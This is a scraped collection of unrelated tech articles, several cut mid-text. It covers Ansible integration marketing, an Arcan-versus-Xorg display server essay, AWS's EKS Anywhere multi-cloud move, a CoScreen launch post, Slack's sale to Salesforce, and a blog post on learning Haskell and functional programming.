Collection is a must. This assures your customers the integration meets the
standards of the Ansible Automation Platform. And we can help you with that.</p>

<h3 id="it-minimizes-customer-churn">It Minimizes Customer Churn</h3>
<p>Customers expect easy-to-use solutions in the modern age. System integrations
make that possible by giving businesses the ability to unify all their
solutions with their preferred configuration management tool. If your product
becomes an integral part of a company’s solution network from day one, thereâ€™s
no incentive to churn at any point in time.</p>
<p>Regardless of the industry, your business can gain a lot from adopting a
customer-centric approach to all operations. With integrations, you can offer
a great customer experience that encourages people to buy more and return for
future purchases.</p>
<p>A <a href="https://blog.cloud-elements.com/why-api-integration-is-crucial-for-software-companies" title="Cloud Elements study on API integrations">study from Cloud Elements</a> found that companies that offer
pre-built integrations can reduce customer churn by 60% and increase customer
lifetime value by 15%.</p>
<h2 id="best-integration-practices">Best Integration Practices</h2>
<p>Integration presents organizations with valuable new business opportunities,
but it is not a guarantee of success on its own. If your company is going to
achieve its goals, you need a well-defined strategy AND a high-quality
integration.</p>
<p>Here are three best practices for software integration to help you maximize
its potential:</p>
<h3 id="good-integrations-start-with-customers">Good Integrations Start With Customers</h3>
<p>The most successful customer-centric organizations build their success on
simple principles: they listen to their customers and put them first.</p>
<p>When it comes to building integrations for your applications, research your
customers. Ask yourself and your customers questions like:</p>
<ul>
<li>What systems and applications do they use now?</li>
<li>What do they want to integrate with?</li>
<li>How could automation and integration make their life easier or make their
business better?</li>
</ul>
<p>When you know your audience at a deep level, you have a blueprint to guide
your internal processes, including your sales and marketing campaigns. With
this guide, you can develop integrations that are tailored to your customersâ€™
needs.</p>
<h3 id="prioritize-long-term-roadmaps-ahead-of-quick-hacks">Prioritize Long-term Roadmaps Ahead of Quick Hacks</h3>
<p>For an integration to deliver the true value to your customers it must be
planned just as much as your core product.</p>
<p>To deliver benefits presented in the previous section, an integration should
not be a side job or a quick hack. You should develop integrations with
long-term business objectives in mind. With …</p></div></div>

December 3, 2020 | https://arcan-fe.com/2020/12/03/arcan-versus-xorg-feature-parity-and-beyond/ | <a href="https://web.archive.org/web/*/https://arcan-fe.com/2020/12/03/arcan-versus-xorg-feature-parity-and-beyond/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<p>This is the follow-up to the <a href="https://arcan-fe.com/2018/10/17/arcan-versus-xorg-approaching-feature-parity/">‘Arcan versus Xorg: approaching feature parity’ </a>article which is recommended reading if you have not done so already.&nbsp;</p>



<p>After that article, there was only one (and a half) real feature left to safely claim parity and that can be covered rather quickly. Thereafter we can nibble on the bites that are in Arcan, but not in Xorg — the reason for the difference in scope is best saved for a different time, although it is a good one.</p>



<p>First, let us not forget that there are more vectors for qualities that are significant to users than just features. Client compatibility is something that has been much lower on the list of priorities, yet is an important quality.</p>



<p>The reason is that prematurely adding support for something like a new display server backend to a toolkit, game engine or windowing library without both necessary and sufficient features in place will lead to a scattered <em>actual</em> feature set. There will be theoretical features, and then the features some clients actually might use some version or interpretation of. These two sets will slip further and further apart unless each affected project has exceptionally alert developers, and the reference implementation having basic hygiene in place regarding conformance verification and validation tools.</p>



<p>We have experimented with such implementations, of course, but that was mainly to test the design and current implementation; to find out where our APIs gets annoying to use, so that nobody else suffers.</p>



<p>The other reason for downplaying compatibility is that client applications has strong biases on how things are “supposed” to work, with the worst offenders being just ‘GUI toolkits’. Small changes can have large impact on application design and you are forced to adapt a certain worldview that lessens your perspective. As a trivial thought exercise, just consider something like a smartphone in a world where touch input was not invented, but eye tracking was flawless.</p>



<p>To re-emphasise the point of the Arcan project as such. It is not, and never was, to reinvent X. The principle program (<a href="https://www.divergent-desktop.org/blog/2020/08/10/principles-overview/">12 principles for a diverging desktop future</a>) say as much. The project is about showing that there were <em>other paths </em>not taken by the big players, and hint at what those paths offered when followed to their logical conclusion.</p>



<p>Most of the lessons in here are not amazing discoveries from diligent research. Rather, they are uncovering wisdom hidden inside the circuits of elderly arcade machines. It is the reason for header-bar image here still being a cropped PCB from that era.</p>



<p>Enough editorialising, towards the Xorgcism! This will again be painfully long and dry. Appy-polly-loggies in advance for that. Quicknav links are as follows:</p>



<ul><li><a href="#network">Network Transparency</a></li><li><a href="#drawing">Drawing API</a></li><li><a href="#migration">Migration and Recovery</a></li><li><a href="#hook">Hook Scripts</a></li><li><a href="#alternate">Alternate Representations</a></li><li><a href="#launching">Application Launching</a></li><li><a href="#state">State Blocks</a></li><li><a href="#audio">Audio</a></li><li><a href="#input">Advanced Input and VR</a></li><li><a href="#xorg_tui">Path from curses and terminals – TUI</a></li></ul>



<h2 id="network">Network Transparency</h2>



<p>The main missing feature was about network support. Luckily I do not have to cover that again — there are already two articles on the topic: one that digs into <a href="https://arcan-fe.com/2018/11/16/the-x-network-transparency-myth/">the situation in Xorg</a>; one that covers <a href="https://arcan-fe.com/2020/10/28/a12-advancing-network-transparency-on-the-desktop/">our solution</a>. If there is anything left to re-emphasise, it would be that the networking part is a completely separate process that <em>reinterprets</em> the networked client data.</p>



<p>There are three reasons for this – this first is that optimal local rendering and optimal remote rendering are incompatible ideas that were historically similar enough that the discrepancy could be tolerated. Nowadays we want <em>both</em> and that takes a different architecture where everyone involved adapts to which one of the two that is currently desired.</p>



<p>The second is for <em>security</em>; the client IPC is a privilege boundary. Network access is yet another privilege boundary. Mixing multiple privilege boundaries within the same process practically merges the two into one in this case, greatly reducing security. <em>Even if</em> you have a separate network process, should all it is doing be proxy-patching packets, you gain very little <em>actual</em> protection. This is because your ‘network process’ is just yet another router or proxy on the way to the real parser in the privileged process, and the only primitive often needed (writing to a file-descriptor) is hard or impossible to ‘sandbox’. </p>



<p>The third is for resilience. Recall the lengths we have previously gone to in order to have<a href="https://arcan-fe.com/2017/12/24/crash-resilient-wayland-compositing/"> crash resilience</a>. There has been much more work done in that direction since the linked article, and one of the final stages is to make sure client state can gracefully survive GPU loss and, should the circumstances permit, machine loss. These things do not work cleanly as an after-thought – the consequences permeate everything.</p>



<h2 id="drawing">Drawing API</h2>



<p>The other feature left was the fabled <strong>drawing</strong> API – to which I would also consider font management — as that lies somewhere in the middle; fonts were already covered in the previous article as part of the section on ‘mixed-DPI’ drawing.</p>



<p>The thing is, Arcan <em>started</em> with a<a href="https://github.com/letoram/arcan/tree/master/doc"> drawing API</a> – initially for specifying interactive animated presentations, documents and some ehrm, darker things of which only beer and cocktails in shady bars might, briefly, bring back to the surface. The display server angle turned into a detour and necessary evil after certain actors could not ‘leave well-enough alone’.</p>



<p>Anyhow, the ‘animated presentations’ bit brought in all kinds of input devices, as well as audio and video. Video parsing and decoding is a finicky process at the best of times, and the typical libraries for this were obvious exploitation vectors. This meant that process separation with least-privilege was clearly needed. With that you get a realtime/media IPC system, so clean that up, add buttons and there is your basic display server.</p>



<p>As a side-note: Having a ‘drawing API’ on the consumer side is not hard per se and, in fact, is the strategy that won, with local raster being a distant fallback. If you want accelerated rendering through OpenGL or Vulkan, it ends up being command buffers (hey, draw commands!) sent to the GPU that will actually turn it into a signal and/or pixels – the drawing won’t happen in-process through the grace of “put pixel”. You could add non-accelerated drawing to Wayland with a one line addition to wl_shm defining a buffer format as <a href="https://en.wikipedia.org/wiki/Scalable_Vector_Graphics">SVG</a>, wouldn’t that be interesting 😉</p>



<p>J’accuse! – I hear you zoladats triumphantly proclaim. That is not for the clients to<strong> </strong>use now is it<strong>‽</strong>. So lwa-ts me explain the two sides to this story.  A longer version with charts and code and everything can be found in the article on <a href="https://arcan-fe.com/2017/10/05/awk-for-realtime-multimedia/">AWK for Multimedia</a>.</p>



<p>The big bit about a drawing API is the level of abstraction it provides. If it is at the low level of  “putPixel()”, you lose —<em> the framebuffer is dead, long live the framebuffer</em>. If it is about “bind set of uniforms, buffers, gpu program and supply commands” you get what the high end graphics libraries already provide. The real challenge is finding the right set of mid-level functions that provide something more without getting morbidly obese to the scale of whatever flavour ‘absorb all’ UI toolkit that is in fashion these days; to understand how, where and when the JS/HTML5/CSS/… soup fail.</p>



<p>Thus, a network friendly, compact, mid-level drawing++ related API is the target. One that can be used out-of-process and as an “intermediate language” (think LLVM-IR) for higher level UI components or document interpreters to render to, while at the same time having the feature set expected of ‘web-app’ like targets.</p>



<p>The “++” represents the process control, audio and meta-IPC routing that is also necessary to cover the span of what is expected of ‘a desktop’. The processing of these commands translate to another intermediate layer, ‘AGP’ which is a simplified subset of OpenGL that was needed as a decoupling mechanism to eventually switch to-/provide- Vulkan and Software rasterisation. It aims at at a network friendly level at about the quality of DOOM3/WebGL, not great, but thereafter video compression starts to win out.</p>



<p>The following figure illustrates the different ways of running Arcan to cover all combinations of ‘drawing API’:</p>



<figure><a href="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png"><img data-attachment-id="8006" data-permalink="https://arcan-fe.com/execmodes-1/" data-orig-file="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png" data-orig-size="952,676" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="execmodes-1" data-image-description="" data-medium-file="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=300" data-large-file="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=640" src="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=952" alt="" srcset="https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png 952w, https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=150 150w, https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=300 300w, https://arcanfe.files.wordpress.com/2020/12/execmodes-1.png?w=768 768w" sizes="(max-width: 952px) 100vw, 952px"></a></figure>



<p>So Arcan can be a client to itself, although it is a separate binary (arcan_lwa –  (<strong>L</strong>ight<strong>w</strong>eight-<strong>a</strong>pplication) marked as ArcanLW in the figure.</p>



<p>ArcanLW will connect to Arcan ‘as a display server’ and act like a normal client. The side benefit here is that if you know how to write an app with the one, you can write or patch the window manager in the other. You get one API to control, manipulate or inspect all the routing for the entirety of your desktop. It privileges separates by design, it has been stable for years.</p>



<p>The last piece to this puzzle is to be able to provide RPC like access to this API. Here is why Lua matters more.</p>



<p>For those not in the know, exposing a C API to the Lua VM is about as simple as it gets and it fits other low level calling conventions; register the symbol name and function pointer of the function in the VM namespace; pop arguments from the stack based on the desired types; process; push the function return to the stack. </p>



<p>It can get more involved than this, but not by much. That actually doubles as a protocol decoder, thus it can be used as a decoupling mechanism. Define a bytecode and t<em>here is your \out of process\ drawing/WM API to bind to other languages.</em></p>



<h2 id="migration">Migration and Recovery</h2>



<p>While we did brush upon crash recovery in the previous post, as well as a <a href="https://arcan-fe.com/2017/12/24/crash-resilient-wayland-compositing/">previous article on the subject</a> – there is still a lot to it. Enough work has been done since to warrant yet another article.</p>



<p>People aware of some GTK history knows that it actually has the underused ability to jump between X Displays. The ‘underused’ part can probably be blamed on the, ehrm, ergonomics of spinning up and maintaining multiple X servers to jump between. Politely put, it was not for the faint of heart. </p>



<p>It is a good idea in principle, …</p></div></div>

AWS’s stated rationale for expanding access to their managed Kubernetes service is all about hybrid cloud, which traditionally has meant “your old busted servers plus AWS’s shiny goodness.”</p><p>But wait … EKS Anywhere<em>? </em>Does that really mean <em>anywhere</em>?</p><p>Could it mean … Azure?</p><p>Lo and behold, <a href="https://www.protocol.com/aws-multicloud-era">Protocol has obtained confirmation</a> that EKS Anywhere (and technically ECS Anywhere, but let’s be real, if you want to run on multiple cloud providers you’re using Kubernetes) <strong>will support workloads running on Azure and GCP as well as private data centers</strong>. AWS is giving you a single pane of glass that will let you roll out config updates, instrument monitoring, and connect other app services to container workloads on your cloud of choice.</p><p>That’s right: AWS just rolled out a multi-cloud container management service.</p><p>You are now permitted thirty seconds to pick your jaw off the floor.</p><h2 id="h-what-does-aws-gain-from-doing-this">What does AWS gain from doing this?</h2><p>This marks … shall we say … a bit of a departure from AWS’s classic “one cloud to rule them all” rhetoric. After all, at various other times in Tuesday’s re:Invent keynote Andy Jassy unleashed <a href="https://aws.amazon.com/rds/aurora/babelfish/">a frontal assault on Microsoft SQL Server</a>, dunked gleefully on archnemesis-turned-punching-bag Oracle, and found GCP so unthreatening that he closed his presentation, without comment, on a song lyric that used “Google” as a verb.</p><p>And yet multi-cloud is here to stay, and Jassy knows it.</p><p>Check out my recent piece <a href="https://cloudirregular.substack.com/p/aws-hearts-multi-cloud-its-gonna">“AWS Hearts Multi-Cloud”</a> for a full analysis of why, but here’s the gist. <a href="https://cloudpundit.com/2020/09/18/the-multicloud-gelatinous-cube/"><strong>Multi-cloud is a gravitational inevitability for enterprises</strong></a>. ACG’s recent <a href="https://acloudguru.com/blog/news/a-cloud-guru-unveils-state-of-cloud-learning-report">State of Cloud Learning Report</a> found that while about 75% of cloud shops still use AWS as their primary cloud provider, the same 75% also have at least some workloads running on Azure or another cloud. Could be due to acquisition, service envy, bet-hedging, or simple lack of coordination – or all of the above. Reality is messy and getting more so.</p><p>AWS has a huge head start on the rest of the cloud industry, but 75% of people won’t think of AWS as their “primary” cloud provider forever. Not when there are so many best-of-breed services to choose from, both on other clouds and on focused SaaS providers like Snowflake and Datadog. And certainly not given that plenty of industries have active incentive to avoid deep integration with a cloud provider owned by Amazon.</p><p>So AWS has a limited window of opportunity to keep that central status in cloud teams’ hearts. Providing higher-level, cross-cloud management tools is the easiest way to do it. The other cloud providers certainly get this; Azure isn’t hamstrung by an inability to admit the validity of AWS workloads, and they’re rushing into the breach with tools like Arc and Sentinel.</p><h2 id="h-this-is-only-the-beginning">This is only the beginning</h2><p>Really, the amazing thing is that AWS spun the “Anywhere” releases so adroitly, and described them so diffusely, that it took a day to confirm that multi-cloud was really their intent. And they can’t keep playing both sides much longer. They need to signal to large customers that yes, they get that Azure isn’t going away, and they’ll provide the tools to continue deserving the status of <em>preferred </em>cloud provider even if they can’t be the <em>only </em>cloud provider.</p><p>If you think that’s a bridge too far, you haven’t been paying attention to what makes AWS tick. I closed my last multi-cloud piece by pointing out that AWS created ECS because they have great engineers; they sell EKS because they are smart. As long as they are willing to cannibalize their own offerings in pursuit of customer value, they will remain hard to beat.</p><figure><div><blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">My ears are perking up at <a href="https://twitter.com/ajassy?ref_src=twsrc%5Etfw">@ajassy</a>'s comments about working with third parties, not being afraid of cannibalizing yourself, etc … are we revving up to the announcement of AWS's much-ballyhooed multicloud play? <a href="https://twitter.com/hashtag/reinvent?src=hash&amp;ref_src=twsrc%5Etfw">#reinvent</a></p>— Forrest Brazeal @re:Invent 2020 (@forrestbrazeal) <a href="https://twitter.com/forrestbrazeal/status/1333806720993333250?ref_src=twsrc%5Etfw">December 1, 2020</a></blockquote> </div></figure><p>Lo and behold, Jassy echoed the same themes in his keynote. And while he never used the word “multi-cloud” (not yet!), you can be sure that EKS Anywhere isn’t a one-off or an accident. It’s the first glimpse of a massive strategic shift. Because once you realize what yesterday’s emphasis on “hybrid, open-source” rhetoric really means, it’s clear that AWS’s multi-cloud play is just beginning.</p></div></div></div>]]>

				<p>Today is as big day for us as we're launching the entirely newly designed &amp; developed 1.0 version of CoScreen for macOS and our private beta for Windows. A big thanks goes out to the hundreds of users who have helped us to iterate over the first versions as part of our private beta over the last 6 months!</p><p><strong>Get CoScreen for free here: <a href="https://coscreen.co/">https://coscreen.co</a></strong></p><p>These early insights and our own internal usage of CoScreen have been instrumental to our code and design reviews, bug fixing, stand-ups, and feature development since the pandemic hit. Now we want more teams to benefit from CoScreen and are therefore offering CoScreen entirely for free for the next six months.</p><blockquote><em>"CoScreen makes coding, pairing and video chatting as easy as a single click while keeping all our existing dev tools."</em><br><strong>M<em>ichaël Ohayon, Development Manager at Publicis Sapient</em></strong></blockquote><h2 id="the-struggle-of-remote-engineering-teams">The struggle of remote engineering teams</h2><p>Today's video chat solutions are great if you enjoy awkward full-screen conversations, but are a productivity killer for development teams. The pandemic has turned endless, boring in-office meetings into endless, boring video calls. It’s also just too painful for engineering teams to wrangle with complex pull requests using a brittle string of tools like Zoom, Skype, Tmux, GNU screen, and a variety of IDEs.</p><h2 id="the-solution-coscreen"> The solution: CoScreen</h2><blockquote>"<em>I am full time pairing with a teammate, and CoScreen is the best pairing tool we’ve used so far.” </em><br><strong>Camille Neuner, Software Engineer at a large insurance provider</strong></blockquote><p>CoScreen is a desktop app that enables multiple users to share application windows with each other at the same time. You can think of it like a shared desktop where any user can interact with any shared window as if it were their own via remote mouse and keyboard to allow them to collaborate like never before (they can even copy and paste code across windows of different users).</p><p>In addition to built-in video chat, and remote control, we're also launching <a href="https://coscreen.co/slack">a Slack integration</a> so that you can embed CoScreen into your daily workflow. Integrations with VS Code and other IDEs will follow soon.</p><p>CoScreen enables pair/mob/team programming like no other solution and we believe it can reduce the <a href="https://blog.rescuetime.com/context-switching">cost of context switching</a> by up to 80% so you can focus on what actually matters - reviewing code, troubleshooting bugs, or building major new features.</p><figure><img src="https://blog.coscreen.co/content/images/2020/09/CoScreen-SevenDegreesOfCollaboration.png" alt="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b7a7fd9f-bf5f-440a-9ec5-7b23b15644bf/Screen_Shot_2020-09-14_at_4.20.50_PM.png" srcset="https://blog.coscreen.co/content/images/size/w600/2020/09/CoScreen-SevenDegreesOfCollaboration.png 600w, https://blog.coscreen.co/content/images/size/w1000/2020/09/CoScreen-SevenDegreesOfCollaboration.png 1000w, https://blog.coscreen.co/content/images/2020/09/CoScreen-SevenDegreesOfCollaboration.png 1323w" sizes="(min-width: 1200px) 1200px"><figcaption>CoScreen introduces the 7th degree of team interactivity through multi-user screen sharing &amp; remote control</figcaption></figure><h2 id="how-coscreen-gives-your-more-control-and-keeps-you-save">How CoScreen gives your more control and keeps you save</h2><p>CoScreen uses P2P whenever you and a second participant can connect directly (e.g. when no corporate firewalls or proxies are between the two of you) so none of your window and control data touches our servers.</p><p>Otherwise, up to a dozen participants can collaborate using our enterprise-grade, HIPAA-compatible video infrastructure with hundreds of servers around the globe that run the awesome open-source framework <a href="https://jitsi.org/">Jitsi</a>. All video data is encrypted using DTLS-SRTP during transmission and in addition, we’re planning to support end-to-end encryption soon.</p><blockquote><em><em><em>“CoScreen makes developing and debugging mobile apps much easier as a team than any other tool we've tried”</em></em></em><br><em><em><em><strong>Kevin Zhang, Senior Software Engineer at Salesforce</strong></em></em></em></blockquote><p>With the help of UX experts who originally designed Slack, we've also created a new, minimalistic UI that never gets in your way. We're making our new macOS version publicly available today for free. The Windows alpha is already in final internal testing and you can sign up for early access for it and our future Linux and web clients.</p><h3 id="can-t-wait-see-for-yourself-how-coscreen-works-">Can’t wait? See for yourself how CoScreen works:</h3><figure><iframe width="459" height="344" src="https://www.youtube.com/embed/054wVitjVJ0?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>We’ll keep sign-ups open as long as our infrastructure allows and we’re working hard to support other platforms, offer the best performance in terms of latency and quality (it's already much better than Zoom’s), and further reduce CPU and memory usage.</p><blockquote><em><em><em>"CoScreen has turned 'meetings' into 'doings.'"</em></em></em><br><em><em><em><strong>Brett Bertola, UX Engineer at InMoment</strong></em></em></em></blockquote><p>Thanks again to everyone who has supported us with feedback and advice. Get the latest release of CoScreen at https://coscreen.co and keep telling us what you think - via the built-in feedback feature in CoScreen or via e-mail to hello@coscreen.co!</p><p><em>Max, Jason, Till &amp; the entire CoScreen team</em></p>

Muhammed Abiodun / Unsplash"></a><figcaption>(Muhammed Abiodun / Unsplash)</figcaption></figure></div><p>Slack’s life as an underdog darling of Silicon Valley ended on November 2, 2016. That’s when the upstart communication startup <a href="https://www.theverge.com/2016/11/2/13497766/slack-microsoft-teams-new-york-times-ad">published an open letter to Microsoft in the </a><em><a href="https://www.theverge.com/2016/11/2/13497766/slack-microsoft-teams-new-york-times-ad">New York Times</a></em>, offering the tech giant an insincere “welcome” to the world of workplace chat software. The occasion was <a href="https://www.theverge.com/2016/10/25/13405200/microsoft-teams-slack-competitor-launch">Microsoft’s launch of Teams</a>, a Slack clone that would come bundled with the company’s popular Office 365 suite of products.</p><p>In its letter, Slack warned Microsoft that “Slack is here to stay,” adding: “we’re just getting started.” But the 4 million users it had at the time would increase to just 12 million four years later, while Microsoft — which added Teams to its 365 bundle without increasing the price — <a href="https://www.theverge.com/2020/10/27/21537286/microsoft-teams-115-million-daily-active-users-stats">took Teams from zero to 115 million users</a>. </p><p>That disparity helps to explain why <a href="https://www.nytimes.com/2020/12/01/technology/salesforce-slack-deal.html">Slack sold itself this week to Salesforce</a>. The deal, which values Slack at $27.7 billion on revenues of $833 million over the past year, has largely been greeted with cheers. (Ben Thompson <a href="https://stratechery.com/2020/salesforce-acquires-slack-salesforces-reasoning-salesforces-opportunity/">offers a typically excellent rundown of the opportunity here for both Salesforce and Slack</a>.)</p><p>But it also feels like the end of an era — one where workers gained new power to bring their own tools to the office, and decide for themselves how they wanted to get work done. Slack first succeeded with small teams who wanted to accelerate their work, and was often dragged into organizations by early adopters. But today, waves of consolidation are leaving people with fewer real choices.</p><p>The rise of smart phones in the early 2010s brought with it a new surge of workplace productivity tools that made mincemeat of everything that had come before them. Box and Dropbox brought easy file storage and sharing. Evernote introduced the idea of ubiquitous, cloud-synchronized note-taking. Sunrise created a more social calendar, while Mailbox and Acompli reimagined email for the mobile phone.</p><p>Slack tiptoed into the conversation in the middle of the decade, and almost immediately became the fastest-growing enterprise software tool of all time. In 2015, just 18 months after it launched, <a href="https://www.theverge.com/2015/6/24/8836087/slack-1-million-daily-users">Slack reported having more than 1 million daily users</a> —&nbsp;a figure then unheard-of in enterprise software.</p><p>It had a great backstory —&nbsp;a last-ditch pivot from a failed video game called Glitch —&nbsp;and, in Stewart Butterfield, one of the tech world’s most charming founders. It also had a bold pitch: it was going to “kill email” —&nbsp;or, at the very least, reduce your reliance on it. And it would do so by integrating hundreds of other services into real-time work chat, creating a kind of all-knowing command console for your organization.</p><p>The company embodied the belief, so common in Silicon Valley, that the best product would win in the end. “Building a product that allows for significant improvements in how people communicate requires a degree of thoughtfulness and craftsmanship that is not common in the development of enterprise software,” the company wrote in its open letter to Microsoft. “How far you go in helping companies truly transform to take advantage of this shift in working is even more important than the individual software features you are duplicating.”</p><p>And yet if there’s a lesson of the past four years, it’s that thoughtfulness and craftsmanship only got the company about 10 percent as far as Microsoft did by copy-pasting Slack’s basic design. In its open letter, Slack famously told Microsoft: “You’ve got to do this with love.” In 2020, looking at Slack’s size, the idea seems laughable. What’s love got to do with it?</p><p>The thing is, I <em>hate</em> that this was the outcome for Slack. I love good productivity tools, and was rooting for Slack to someday become as good as the company hyped it up to be. (And perhaps it still will: like most giants Salesforce has a mixed track record when it comes to the success of its acquisitions, but some seem to be thriving. When I asked about this on Twitter, people had <a href="https://twitter.com/caseynewton/status/1333891286185644032?s=21">a lot of good things to say about post-acquisition Heroku</a>.)</p><p>But Slack’s struggle to succeed as an independent company sadly mirrors that of many one-time innovators in enterprise productivity. Mailbox died and Acompli sold to Microsoft, where it became the mobile Outlook app. Evernote is a pale shadow of its former self. Of that early cohort, only Box and Dropbox became — and still remain —&nbsp;public companies.</p><p>Why is this the case? To get some insight, I called up Aaron Levie, Box’s affable CEO. In Levie’s telling —&nbsp;and he also wrote <a href="https://blog.box.com/salesforce-slack-and-future-work">a blog post about the Slack sale</a> — it all comes down to sales. The idea that workers would someday choose all their own tools was always a fantasy, he told me, in part because most workers don’t event want to think about their tools. In such a world, the winning app will almost always be one with a giant, er, salesforce behind it. </p><p>Microsoft had one. Slack didn’t. Enter Salesforce.</p><p>“The reality with the enterprise is that you can have the best product, but that’s not good enough,” Levie told me. “You need distribution. And what Salesforce has — they have the procurement officers, they have the finance people. They have all of the apparatus you need to interact with to sell software, and they have it for the top 100,000 corporations around the world.”</p><p>Levie is bullish on the acquisition, because it puts Slack and Salesforce on more even ground. </p><p>“The only advantage Microsoft has is distribution, and so now they’ve neutralized the advantage that Microsoft has had,” he said. “All of a sudden, they can actually fulfill the ultimate promise of the opportunity, because they have 10 times the amount of salespeople that can go distribute this thing into corporations around the world.”</p><p>Assuming Levie is right — and I wouldn’t bet against him — that means the medium-term future of work is increasingly a choice between three giants: Microsoft, Salesforce, and (in a distant third) Google. And with that, the golden age of worker choice in productivity tools seems to be coming to an end.</p><p>That’s not to say that the incumbents won’t always face new challengers. But I wonder whether the low ceiling that Slack turned out to have has implications for some of the other fast-growing productivity companies of the current moment. Should Slack’s sale diminish our expectations for Airtable, or Notion, or Coda? Don’t get me wrong — I’m confident their investors will all get their money back, and then some. But do they have a real future outside the arms of a monolith?</p><p>If not, then the productivity market will become as consolidated as any number of other spaces on the internet, from app stores to search engines to social networks. And as our government antitrust regulators begin to awaken after a long period of hibernation, I wonder if they’ll have anything to say about it.</p><h3>The Ratio</h3><p><em>Today in news that could affect public perception of the big tech companies</em></p><p>⬆️ <strong>Trending up</strong>: <strong><a href="https://techcrunch.com/2020/12/02/google-news-showcase-paywalled-stories/">Google</a></strong><a href="https://techcrunch.com/2020/12/02/google-news-showcase-paywalled-stories/">’s new paid deals with publishers mean that access to some paywalled content will now be available to readers for free</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article role="main">
        <p>When I started my first full-time job as a software engineer out of college, I frequently had discussions with my fellow new-hires about our technical adventures up to that point. At one point, two of them mentioned something called a “monad” and went back and forth about it for a few minutes. My first thought was:</p>

<blockquote>
  <p>“Monad?? What is a monad? Am I supposed to know what that is?!”</p>
</blockquote>

<p>I remember just nodding along as I had this conversation in my head. The first thing I did when I got back to my desk was search “What is a monad”, as any curious programmer would. I was greeted with a plethora of articles, all of which made me scratch my head after reading. I had to get back to work but I decided to bookmark a few more articles and continue later. Safe to say the proverbial can of worms was opened.</p>

<p>I fondly remember this moment as the beginning of my foray into functional programming (I had a grand total of 2-3 weeks of scheme in college so I don’t count that). Up until now I had primarily programmed in C/C++, Python, Javascript, and some Go. Somehow I had escaped the pull of functional programming languages until then, and I’ve been spending a lot of my free time learning functional programming paradigms since that moment. I wouldn’t dare try to explain what a monad is in my inaugural post on functional programming, but I do hope to explain a bit about why I’m so excited to learn more about functional programming and how I think it will help me as a software engineer.</p>

<h3 id="what-is-a-functional-language">What is a Functional language?</h3>

<p>A very small number of companies actually use functional languages in a professional capacity, so how could learning about them help me? To answer that I think it would help to agree on some of the central tenants of functional programming.</p>
<ul>
  <li>One of the core principles of functional languages that stuck with me right away is that you cannot mutate data once it has been created. Instead of directly mutating the data like you would in an imperative language like C++, you just make a fresh copy with the desired update. This is also referred to as stateless programming. One benefit of stateless programming is that you do not have to worry about multiple threads modifying the same data because each thread gets its own copy.</li>
  <li>Referential transparency essentially means that you can replace an expression with its result. So instead of <code>1+2</code> you could simply write <code>3</code>. That’s a trivial example, but where it becomes more interesting is with functions. With referential transparency you don’t have to worry about the function producing side effects or mutating some global state that affects other parts of the program. You can legitimately replace the function call (an expression) with its result and be done. Functions are also repeatable which means they don’t depend on external state themselves. Some other phrases thrown around when describing functional programming languages are “pure” and “no side effects”, and I think referential transparency encapsulates both of those. This contrasts with imperative languages because if I call a function <code>foo()</code> in C++, I have no way of knowing if it updated some global state! It’s not always true that I can replace <code>foo()</code> with it’s return value and expect the program to behave the same way.</li>
  <li>Another major characteristic of functional programming is the fact that functions are first order citizens. Many object-oriented languages have begun to add this to their feature set, but higher-order functions are rooted in functional programming. This means you can do things like pass functions into other functions, receive new functions as the result of a different function call, and create anonymous functions (also known as closures). When we create a closure, we create a function on the spot and capture some data that we’d like to use in the function. This is useful because we can then pass that closure (which is just a function) into other functions and it will always have the data it originally captured to perform its task. For example, these constructs allow a language to implement the <code>map</code> function, which applies a function <code>f</code> to each element in a collection - you can’t do that without sending <code>f</code> in as an argument to <code>map</code>. In this case <code>f</code> could be a function we’ve already defined or it could be a closure we just created with some extra data. This provides an incredible amount of flexibility that I’m only beginning to understand how to wield!</li>
</ul>

<p>This is not an exhaustive list, these are just the main concepts I think about when it comes to functional programming. The more I program in functional languages, the more I am learning about the implications of each of these principles as well as other core tenants of functional programming. Later in this post I’ll highlight how even just a surface level exposure to these principles has positively impacted my day job.</p>

<h3 id="learning-a-functional-language">Learning a Functional Language</h3>

<p>After reading about functional programming and how great it is, I just had to try it out! There are plenty of languages to choose from, but I decided to go with Haskell mostly because it’s a pure functional language (as opposed to impure functional languages, which support imperative style programming). I figured if I’m going to start learning I might as well go with the “most” functional one. I’m still not sure if that was the best decision or not but I don’t think it matters very much!</p>

<p>The first thing I realized is that the learning curve is pretty steep. I started by going through <a href="http://book.realworldhaskell.org/">Real World Haskell</a> and <a href="http://dev.stephendiehl.com/hask/index.html">What I Wish I Knew When Learning Haskell</a>, among others. After getting through the basics, I started to get a little overwhelmed. I knew this was going to be different and I was excited for that, but I was utterly shocked at how many words I was reading for the first time! In my <a href="https://bitsbybrad.com/2020-09-29-learning-rust/">last post</a> I wrote briefly about how I learned Rust. I think part of the reason I was so shocked is because I was able to feel comfortable in Rust quickly. It has a similar syntax to C++ and other imperative languages I have used so it was not a huge adjustment. Additionally, there were only a few genuinely new concepts that I had not heard of before. Contrast this to Haskell where I felt like there were only a few concepts that I <em>did</em> recognize. I (naively) was not expecting that after ~6 years of programming, but hey that’s why I fell in love with coding in the first place!</p>

